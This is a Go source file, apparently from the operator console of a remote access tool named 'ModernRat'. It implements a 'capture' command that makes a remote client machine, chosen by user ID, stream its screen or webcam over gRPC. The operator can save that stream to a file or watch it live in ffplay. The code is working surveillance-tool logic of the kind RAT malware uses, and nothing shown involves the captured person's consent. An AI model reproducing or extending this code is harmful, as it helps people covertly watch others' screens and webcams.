package main

import (
	"bufio"
	"context"
	"errors"
	"fmt"
	"io"
	"os"
	"os/exec"
	"path/filepath"
	"runtime"
	"strconv"
	"strings"
	"sync"
	"time"

	"github.com/google/uuid"
	pb "modernrat-client/gen"

	"google.golang.org/grpc/metadata"
)

func (a *adminApp) handleCaptureCommand(args []string) error {
	if len(args) == 0 {
		return errors.New("capture コマンド: capture start|stop [options]")
	}

	sub := strings.ToLower(args[0])
	switch sub {
	case "start":
		userOverride, positional, err := extractUserFlag(args[1:])
		if err != nil {
			return err
		}
		opts, err := parseCaptureStartArgs(positional)
		if err != nil {
			return err
		}

		userID, err := a.resolveUser(userOverride)
		if err != nil {
			return err
		}
		opts.userID = userID

		return a.startCaptureSession(opts)

	case "stop":
		return a.stopCaptureSession()

	default:
		return fmt.Errorf("未知の capture サブコマンドです: %s", sub)
	}
}

type captureStartOptions struct {
	userID       string
	savePath     string
	openPlayer   bool
	encoder      string
	format       string
	framerate    int
	framerateSet bool
	bitrate      int
	width        int
	height       int
	keyframe     int
	noSave       bool
	source       string
	device       string
}

func parseCaptureStartArgs(args []string) (captureStartOptions, error) {
	opts := captureStartOptions{}
	opts.framerate = 24
	opts.bitrate = 1500
	opts.width = 1280
	opts.height = 720
	opts.keyframe = 48
	opts.source = "screen"

	for i := 0; i < len(args); {
		arg := args[i]
		switch {
		case arg == "--open" || arg == "-o":
			opts.openPlayer = true
			i++

		case arg == "--save":
			if i+1 >= len(args) {
				return opts, errors.New("--save フラグにはパスが必要です")
			}
			opts.savePath = args[i+1]
			i += 2

		case strings.HasPrefix(arg, "--save="):
			opts.savePath = strings.TrimPrefix(arg, "--save=")
			i++

		case arg == "--encoder":
			if i+1 >= len(args) {
				return opts, errors.New("--encoder フラグには値が必要です")
			}
			opts.encoder = args[i+1]
			i += 2

		case strings.HasPrefix(arg, "--encoder="):
			opts.encoder = strings.TrimPrefix(arg, "--encoder=")
			i++

		case arg == "--keyframe":
			if i+1 >= len(args) {
				return opts, errors.New("--keyframe フラグには数値が必要です")
			}
			val, err := strconv.Atoi(args[i+1])
			if err != nil || val <= 0 {
				return opts, errors.New("--keyframe には正の整数を指定してください")
			}
			opts.keyframe = val
			i += 2

		case strings.HasPrefix(arg, "--keyframe="):
			val, err := strconv.Atoi(strings.TrimPrefix(arg, "--keyframe="))
			if err != nil || val <= 0 {
				return opts, errors.New("--keyframe には正の整数を指定してください")
			}
			opts.keyframe = val
			i++

		case arg == "--format":
			if i+1 >= len(args) {
				return opts, errors.New("--format フラグには値が必要です")
			}
			opts.format = args[i+1]
			i += 2

		case strings.HasPrefix(arg, "--format="):
			opts.format = strings.TrimPrefix(arg, "--format=")
			i++

		case arg == "--framerate":
			if i+1 >= len(args) {
				return opts, errors.New("--framerate フラグには数値が必要です")
			}
			val, err := strconv.Atoi(args[i+1])
			if err != nil || val <= 0 {
				return opts, errors.New("--framerate には正の整数を指定してください")
			}
			opts.framerate = val
			opts.framerateSet = true
			i += 2

		case strings.HasPrefix(arg, "--framerate="):
			val, err := strconv.Atoi(strings.TrimPrefix(arg, "--framerate="))
			if err != nil || val <= 0 {
				return opts, errors.New("--framerate には正の整数を指定してください")
			}
			opts.framerate = val
			opts.framerateSet = true
			i++

		case arg == "--bitrate":
			if i+1 >= len(args) {
				return opts, errors.New("--bitrate フラグには数値が必要です")
			}
			val, err := strconv.Atoi(args[i+1])
			if err != nil || val <= 0 {
				return opts, errors.New("--bitrate には正の整数を指定してください")
			}
			opts.bitrate = val
			i += 2

		case strings.HasPrefix(arg, "--bitrate="):
			val, err := strconv.Atoi(strings.TrimPrefix(arg, "--bitrate="))
			if err != nil || val <= 0 {
				return opts, errors.New("--bitrate には正の整数を指定してください")
			}
			opts.bitrate = val
			i++

		case arg == "--width":
			if i+1 >= len(args) {
				return opts, errors.New("--width フラグには数値が必要です")
			}
			val, err := strconv.Atoi(args[i+1])
			if err != nil || val <= 0 {
				return opts, errors.New("--width には正の整数を指定してください")
			}
			opts.width = val
			i += 2

		case strings.HasPrefix(arg, "--width="):
			val, err := strconv.Atoi(strings.TrimPrefix(arg, "--width="))
			if err != nil || val <= 0 {
				return opts, errors.New("--width には正の整数を指定してください")
			}
			opts.width = val
			i++

		case arg == "--height":
			if i+1 >= len(args) {
				return opts, errors.New("--height フラグには数値が必要です")
			}
			val, err := strconv.Atoi(args[i+1])
			if err != nil || val <= 0 {
				return opts, errors.New("--height には正の整数を指定してください")
			}
			opts.height = val
			i += 2

		case strings.HasPrefix(arg, "--height="):
			val, err := strconv.Atoi(strings.TrimPrefix(arg, "--height="))
			if err != nil || val <= 0 {
				return opts, errors.New("--height には正の整数を指定してください")
			}
			opts.height = val
			i++

		case arg == "--source":
			if i+1 >= len(args) {
				return opts, errors.New("--source フラグには値が必要です")
			}
			stype := strings.ToLower(strings.TrimSpace(args[i+1]))
			if err := validateCaptureSource(stype); err != nil {
				return opts, err
			}
			opts.source = stype
			if stype == "webcam" && !opts.framerateSet {
				opts.framerate = 0
			}
			if stype == "screen" && !opts.framerateSet {
				opts.framerate = 24
			}
			i += 2

		case strings.HasPrefix(arg, "--source="):
			stype := strings.ToLower(strings.TrimSpace(strings.TrimPrefix(arg, "--source=")))
			if err := validateCaptureSource(stype); err != nil {
				return opts, err
			}
			opts.source = stype
			if stype == "webcam" && !opts.framerateSet {
				opts.framerate = 0
			}
			if stype == "screen" && !opts.framerateSet {
				opts.framerate = 24
			}
			i++

		case arg == "--device":
			if i+1 >= len(args) {
				return opts, errors.New("--device フラグには値が必要です")
			}
			opts.device = args[i+1]
			i += 2

		case strings.HasPrefix(arg, "--device="):
			opts.device = strings.TrimPrefix(arg, "--device=")
			i++

		case arg == "--webcam":
			opts.source = "webcam"
			if !opts.framerateSet {
				opts.framerate = 0
			}
			i++

		case arg == "--no-save":
			opts.noSave = true
			i++

		default:
			return opts, fmt.Errorf("未知のフラグです: %s", arg)
		}
	}

	return opts, nil
}

func validateCaptureSource(stype string) error {
	switch stype {
	case "", "screen":
		return nil
	case "webcam":
		return nil
	default:
		return fmt.Errorf("--source には screen か webcam を指定してください")
	}
}

func (a *adminApp) startCaptureSession(opts captureStartOptions) error {
	if opts.userID == "" {
		return errors.New("ユーザーIDを解決できませんでした")
	}

	a.captureMu.Lock()
	if a.capture != nil {
		a.captureMu.Unlock()
		return errors.New("既にスクリーンキャプチャが実行中です (capture stop で停止してください)")
	}
	a.captureMu.Unlock()

	savePath := strings.TrimSpace(opts.savePath)
	if savePath != "" {
		expanded, err := expandLocalPath(savePath)
		if err != nil {
			return fmt.Errorf("保存先パスを解決できません: %w", err)
		}
		savePath = expanded
	}

	if opts.noSave {
		savePath = ""
	}

	if opts.format == "" {
		opts.format = "video/mp2t"
	}

	if savePath == "" && !opts.noSave {
		savePath = defaultCaptureFilename(opts.userID, opts.format)
	}

	if !opts.noSave {
		dir := filepath.Dir(savePath)
		if err := os.MkdirAll(dir, 0o755); err != nil {
			return fmt.Errorf("保存先ディレクトリを作成できません: %w", err)
		}
	}

	framerate := opts.framerate
	if opts.source == "webcam" && !opts.framerateSet {
		framerate = 0
	}
	inputType := pb.CaptureInputType_CAPTURE_INPUT_TYPE_SCREEN
	if opts.source == "webcam" {
		inputType = pb.CaptureInputType_CAPTURE_INPUT_TYPE_WEBCAM
	}
	settings := &pb.CaptureSettings{
		Format:           opts.format,
		Encoder:          opts.encoder,
		Framerate:        int32(framerate),
		BitrateKbps:      int32(opts.bitrate),
		Width:            int32(opts.width),
		Height:           int32(opts.height),
		KeyframeInterval: int32(opts.keyframe),
		CaptureSource:    strings.TrimSpace(opts.device),
		InputType:        inputType,
	}

	ctx, cancel := context.WithCancel(a.ctx)
	md := metadata.New(map[string]string{"authorization": "Bearer " + a.token})
	streamCtx := metadata.NewOutgoingContext(ctx, md)

	stream, err := a.captureClient.AdminCapture(streamCtx)
	if err != nil {
		cancel()
		return fmt.Errorf("スクリーンキャプチャストリームの開始に失敗しました: %w", err)
	}

	controller := newCaptureController(a, opts.userID, savePath, opts.openPlayer, opts.noSave, settings, stream, ctx, cancel)

	a.captureMu.Lock()
	if a.capture != nil {
		a.captureMu.Unlock()
		controller.dispose()
		return errors.New("既にスクリーンキャプチャが実行中です (capture stop で停止してください)")
	}
	a.capture = controller
	a.captureMu.Unlock()

	if err := controller.start(); err != nil {
		controller.dispose()
		a.captureMu.Lock()
		if a.capture == controller {
			a.capture = nil
		}
		a.captureMu.Unlock()
		return err
	}
	if controller.noSave {
		fmt.Printf("%s %s\n", uiColors.wrap(uiColors.success, "スクリーンキャプチャを開始しました:"), uiColors.wrap(uiColors.accent, "保存なし"))
	} else {
		fmt.Printf("%s %s\n", uiColors.wrap(uiColors.success, "スクリーンキャプチャを開始しました:"), uiColors.wrap(uiColors.accent, controller.savePath))
	}
	if controller.openPlayer {
		fmt.Println(uiColors.wrap(uiColors.accent, "  -> ffplay でライブビューを開きました"))
	}
	fmt.Println(uiColors.wrap(uiColors.accent, "  -> capture stop で停止できます"))

	return nil
}

func (a *adminApp) stopCaptureSession() error {
	a.captureMu.Lock()
	controller := a.capture
	a.captureMu.Unlock()

	if controller == nil {
		fmt.Println(uiColors.wrap(uiColors.warn, "スクリーンキャプチャは実行されていません"))
		return nil
	}

	if err := controller.stop(); err != nil {
		return fmt.Errorf("停止要求の送信に失敗しました: %w", err)
	}

	if err := controller.wait(15 * time.Second); err != nil {
		return fmt.Errorf("停止の完了を待機中にタイムアウトしました: %w", err)
	}

	return nil
}

func (a *adminApp) captureFinished(ctrl *captureController, err error) {
	a.captureMu.Lock()
	if a.capture == ctrl {
		a.capture = nil
	}
	a.captureMu.Unlock()

	if err != nil && !errors.Is(err, context.Canceled) && !errors.Is(err, io.EOF) {
		fmt.Printf("%s %v\n", uiColors.wrap(uiColors.error, "スクリーンキャプチャが異常終了しました:"), err)
		return
	}
	if ctrl.noSave {
		fmt.Println(uiColors.wrap(uiColors.success, "スクリーンキャプチャを停止しました (保存なし)"))
		return
	}
	fmt.Printf("%s %s\n", uiColors.wrap(uiColors.success, "スクリーンキャプチャを保存しました:"), uiColors.wrap(uiColors.accent, ctrl.savePath))
}

func defaultCaptureFilename(userID, format string) string {
	timestamp := time.Now().Format("20060102-150405")
	ext := captureFormatExtension(format)
	name := fmt.Sprintf("capture-%s-%s%s", shortUserID(userID), timestamp, ext)
	return filepath.Join(".", name)
}

func captureFormatExtension(format string) string {
	switch strings.ToLower(strings.TrimSpace(format)) {
	case "video/mp2t", "video/mpegts", "mpegts", "ts":
		return ".ts"
	case "video/mp4", "mp4":
		return ".mp4"
	case "video/webm", "webm":
		return ".webm"
	case "video/matroska", "matroska", "mkv":
		return ".mkv"
	default:
		return ".bin"
	}
}

type captureController struct {
	app        *adminApp
	userID     string
	savePath   string
	openPlayer bool
	noSave     bool
	settings   *pb.CaptureSettings

	ctx    context.Context
	cancel context.CancelFunc
	stream pb.ScreenCaptureService_AdminCaptureClient

	requestID string

	sessionMu sync.Mutex
	sessionID string

	writerMu    sync.RWMutex
	writer      io.Writer
	writerReady chan struct{}
	writerOnce  sync.Once

	fileWriter *asyncFileWriter
	player     *exec.Cmd
	playerW    io.WriteCloser

	readyCh  chan *pb.ScreenCaptureMessage
	done     chan struct{}
	doneOnce sync.Once
	errMu    sync.Mutex
	err      error

	suppressMu sync.Mutex
	suppress   bool
}

func newCaptureController(app *adminApp, userID, savePath string, open bool, noSave bool, settings *pb.CaptureSettings, stream pb.ScreenCaptureService_AdminCaptureClient, ctx context.Context, cancel context.CancelFunc) *captureController {
	return &captureController{
		app:         app,
		userID:      userID,
		savePath:    savePath,
		openPlayer:  open,
		noSave:      noSave,
		settings:    settings,
		ctx:         ctx,
		cancel:      cancel,
		stream:      stream,
		requestID:   uuid.NewString(),
		writerReady: make(chan struct{}),
		readyCh:     make(chan *pb.ScreenCaptureMessage, 1),
		done:        make(chan struct{}),
	}
}

func (c *captureController) start() error {
	go c.run()

	startMsg := &pb.ScreenCaptureMessage{
		Type:      pb.ScreenCaptureMessageType_SCREEN_CAPTURE_MESSAGE_TYPE_START,
		UserId:    c.userID,
		RequestId: c.requestID,
		Settings:  cloneCaptureSettings(c.settings),
		Text:      "admin capture start",
	}

	if err := c.stream.Send(startMsg); err != nil {
		return fmt.Errorf("スクリーンキャプチャ開始リクエストの送信に失敗しました: %w", err)
	}

	select {
	case ready := <-c.readyCh:
		c.sessionMu.Lock()
		c.sessionID = ready.GetSessionId()
		c.sessionMu.Unlock()

	case <-time.After(10 * time.Second):
		return errors.New("クライアントからの応答がタイムアウトしました")

	case <-c.done:
		return c.err
	}

	var writers []io.Writer

	if !c.noSave {
		file, err := os.Create(c.savePath)
		if err != nil {
			return fmt.Errorf("保存ファイルの作成に失敗しました: %w", err)
		}
		asyncWriter := newAsyncFileWriter(file, 8, 1<<20)
		c.fileWriter = asyncWriter
		writers = append(writers, asyncWriter)
	}
	if c.openPlayer {
		playerPath, err := resolveFFplayPath()
		if err != nil {
			return err
		}
		player, stdin, err := launchFFplay(playerPath, c.savePath)
		if err != nil {
			return err
		}
		c.player = player
		c.playerW = stdin
		writers = append(writers, stdin)
	}

	if len(writers) == 0 {
		writers = append(writers, io.Discard)
	}
	c.setWriter(io.MultiWriter(writers...))
	return nil
}

func (c *captureController) stop() error {
	stopMsg := &pb.ScreenCaptureMessage{
		Type:      pb.ScreenCaptureMessageType_SCREEN_CAPTURE_MESSAGE_TYPE_STOP,
		UserId:    c.userID,
		SessionId: c.currentSessionID(),
		RequestId: uuid.NewString(),
		Text:      "admin requested stop",
	}

	if stopMsg.GetSessionId() == "" {
		// If the session ID is not yet known, rely on user_id routing.
		stopMsg.SessionId = ""
	}

	if err := c.stream.Send(stopMsg); err != nil {
		return err
	}
	return nil
}

func (c *captureController) wait(timeout time.Duration) error {
	select {
	case <-c.done:
		return c.err
	case <-time.After(timeout):
		return errors.New("timeout")
	}
}

func (c *captureController) run() {
	for {
		msg, err := c.stream.Recv()
		if err != nil {
			c.finish(err)
			return
		}

		switch msg.GetType() {
		case pb.ScreenCaptureMessageType_SCREEN_CAPTURE_MESSAGE_TYPE_READY:
			c.notifyReady(msg)

		case pb.ScreenCaptureMessageType_SCREEN_CAPTURE_MESSAGE_TYPE_DATA:
			if err := c.handleData(msg); err != nil {
				c.finish(err)
				return
			}

		case pb.ScreenCaptureMessageType_SCREEN_CAPTURE_MESSAGE_TYPE_COMPLETE:
			c.finish(nil)
			return

		case pb.ScreenCaptureMessageType_SCREEN_CAPTURE_MESSAGE_TYPE_ERROR:
			err := errors.New(strings.TrimSpace(msg.GetText()))
			if err.Error() == "" {
				err = errors.New("capture reported error")
			}
			c.finish(err)
			return

		default:
			// Ignore other message types.
		}
	}
}

func (c *captureController) notifyReady(msg *pb.ScreenCaptureMessage) {
	select {
	case c.readyCh <- msg:
	default:
	}
}

func (c *captureController) handleData(msg *pb.ScreenCaptureMessage) error {
	chunk := msg.GetData()
	if len(chunk) == 0 {
		return nil
	}

	if err := c.waitForWriter(); err != nil {
		return err
	}

	c.writerMu.RLock()
	writer := c.writer
	c.writerMu.RUnlock()
	if writer == nil {
		return errors.New("capture writer not initialized")
	}

	if _, err := writer.Write(chunk); err != nil {
		return fmt.Errorf("スクリーンキャプチャデータの書き込みに失敗しました: %w", err)
	}
	return nil
}

func (c *captureController) waitForWriter() error {
	select {
	case <-c.writerReady:
		return nil
	case <-c.done:
		return errors.New("writer unavailable")
	}
}

func (c *captureController) setWriter(w io.Writer) {
	c.writerMu.Lock()
	c.writer = w
	c.writerMu.Unlock()

	c.writerOnce.Do(func() {
		close(c.writerReady)
	})
}

func (c *captureController) finish(err error) {
	c.errMu.Lock()
	if c.err == nil {
		if err == nil || errors.Is(err, io.EOF) {
			c.err = nil
		} else {
			c.err = err
		}
	}
	finalErr := c.err
	c.errMu.Unlock()

	c.cleanup()

	c.doneOnce.Do(func() {
		close(c.done)
	})

	if c.notificationsSuppressed() {
		return
	}
	c.app.captureFinished(c, finalErr)
}

func (c *captureController) cleanup() {
	if c.playerW != nil {
		_ = c.playerW.Close()
	}
	if c.player != nil {
		go func(cmd *exec.Cmd) {
			_ = cmd.Wait()
		}(c.player)
	}
	if c.fileWriter != nil {
		_ = c.fileWriter.Close()
		c.fileWriter = nil
	}
	_ = c.stream.CloseSend()
	if c.cancel != nil {
		c.cancel()
	}
}

func (c *captureController) dispose() {
	c.suppressNotifications()
	c.cleanup()
	c.doneOnce.Do(func() {
		close(c.done)
	})
}

func (c *captureController) shutdown() {
	c.finish(errors.New("capture aborted"))
}

func (c *captureController) currentSessionID() string {
	c.sessionMu.Lock()
	defer c.sessionMu.Unlock()
	return c.sessionID
}

func resolveFFplayPath() (string, error) {
	exe, err := os.Executable()
	if err == nil {
		dir := filepath.Dir(exe)
		for _, candidate := range ffplayCandidates() {
			path := filepath.Join(dir, candidate)
			if fileExists(path) {
				return path, nil
			}
		}
	}

	for _, candidate := range ffplayCandidates() {
		if path, err := exec.LookPath(candidate); err == nil {
			return path, nil
		}
	}

	return "", errors.New("ffplay executable not found (bin ディレクトリに配置するか PATH に追加してください)")
}

func ffplayCandidates() []string {
	if runtime.GOOS == "windows" {
		return []string{"ffplay.exe"}
	}
	return []string{"ffplay"}
}

func launchFFplay(path, savePath string) (*exec.Cmd, io.WriteCloser, error) {
	title := fmt.Sprintf("ModernRat Capture - %s", filepath.Base(savePath))
	cmd := exec.Command(path, "-autoexit", "-window_title", title, "-fflags", "nobuffer", "-flags", "low_delay", "-framedrop", "-x", "1280", "-y", "720", "-i", "pipe:0")
	cmd.Stdout = os.Stdout
	cmd.Stderr = os.Stderr
	stdin, err := cmd.StdinPipe()
	if err != nil {
		return nil, nil, err
	}
	if err := cmd.Start(); err != nil {
		return nil, nil, err
	}
	return cmd, stdin, nil
}

func (c *captureController) suppressNotifications() {
	c.suppressMu.Lock()
	c.suppress = true
	c.suppressMu.Unlock()
}

func (c *captureController) notificationsSuppressed() bool {
	c.suppressMu.Lock()
	defer c.suppressMu.Unlock()
	return c.suppress
}

func cloneCaptureSettings(settings *pb.CaptureSettings) *pb.CaptureSettings {
	if settings == nil {
		return nil
	}
	copy := *settings
	return &copy
}

func fileExists(path string) bool {
	info, err := os.Stat(path)
	if err != nil {
		return false
	}
	return !info.IsDir()
}

// asyncFileWriter decouples disk writes from the capture loop to keep realtime playback responsive.
type asyncFileWriter struct {
	file      *os.File
	buf       *bufio.Writer
	chunks    chan []byte
	done      chan struct{}
	errMu     sync.Mutex
	err       error
	closeOnce sync.Once
}

func newAsyncFileWriter(file *os.File, queueDepth, bufferSize int) *asyncFileWriter {
	if queueDepth <= 0 {
		queueDepth = 8
	}
	if bufferSize <= 0 {
		bufferSize = 1 << 20
	}

	w := &asyncFileWriter{
		file:   file,
		buf:    bufio.NewWriterSize(file, bufferSize),
		chunks: make(chan []byte, queueDepth),
		done:   make(chan struct{}),
	}
	go w.run()
	return w
}

func (w *asyncFileWriter) Write(p []byte) (int, error) {
	if err := w.getErr(); err != nil {
		return 0, err
	}

	copyBuf := append([]byte(nil), p...)

	select {
	case w.chunks <- copyBuf:
		return len(p), nil
	case <-w.done:
		return 0, w.getErr()
	}
}

func (w *asyncFileWriter) Close() error {
	w.closeOnce.Do(func() {
		close(w.chunks)
		<-w.done
	})
	return w.getErr()
}

func (w *asyncFileWriter) run() {
	defer close(w.done)

	draining := false
	for chunk := range w.chunks {
		if chunk == nil {
			continue
		}
		if draining {
			continue
		}
		if _, err := w.buf.Write(chunk); err != nil {
			w.setErr(err)
			draining = true
		}
	}

	if err := w.buf.Flush(); err != nil {
		w.setErr(err)
	}
	if err := w.file.Close(); err != nil {
		w.setErr(err)
	}
}

func (w *asyncFileWriter) setErr(err error) {
	if err == nil {
		return
	}
	w.errMu.Lock()
	if w.err == nil {
		w.err = err
	}
	w.errMu.Unlock()
}

func (w *asyncFileWriter) getErr() error {
	w.errMu.Lock()
	defer w.errMu.Unlock()
	return w.err
}
